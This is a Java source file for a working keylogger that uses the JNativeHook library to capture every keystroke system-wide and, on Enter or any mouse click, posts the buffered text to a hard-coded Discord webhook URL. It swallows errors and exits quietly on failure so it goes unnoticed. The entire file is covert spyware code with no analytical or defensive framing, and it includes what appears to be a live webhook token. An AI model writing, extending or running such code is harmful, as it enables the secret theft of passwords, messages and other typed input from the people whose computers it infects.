import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.List;

public class KeyLogger implements NativeKeyListener, NativeMouseListener {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1385414574320128011/noas_w3-JL-e2yGQrHK0KU0bkqfd384NbDbFAPCm44amFz5S2u_nH8bLx4g3BcJp-T2T";
    private List<String> keystrokes = new ArrayList<>();

    public void nativeKeyPressed(NativeKeyEvent e) {
        // No action
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (keyText.length() > 1) {
            keystrokes.add("[" + keyText + "]");
        } else {
            keystrokes.add(keyText);
        }
        if (keyText.equals("Enter")) {
            sendData();
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Empty
    }

    public void nativeMouseClicked(NativeMouseEvent e) {
        sendData();
    }

    public void nativeMousePressed(NativeMouseEvent e) {
        // No action
    }

    public void nativeMouseReleased(NativeMouseEvent e) {
        // No action
    }

    private void sendData() {
        if (keystrokes.isEmpty()) {
            return;
        }
        String message = String.join("", keystrokes);
        message = message.replace("\\", "\\\\").replace("\"", "\\\"");
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(WEBHOOK_URL))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString("{\"content\": \"" + message + "\"}"))
                .build();
        try {
            client.send(request, HttpResponse.BodyHandlers.ofString());
        } catch (Exception e) {
            // Silently handle errors
        }
        keystrokes.clear();
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.exit(1); // Silently exit on failure
        }
        KeyLogger listener = new KeyLogger();
        GlobalScreen.addNativeKeyListener(listener);
        GlobalScreen.addNativeMouseListener(listener);
    }
}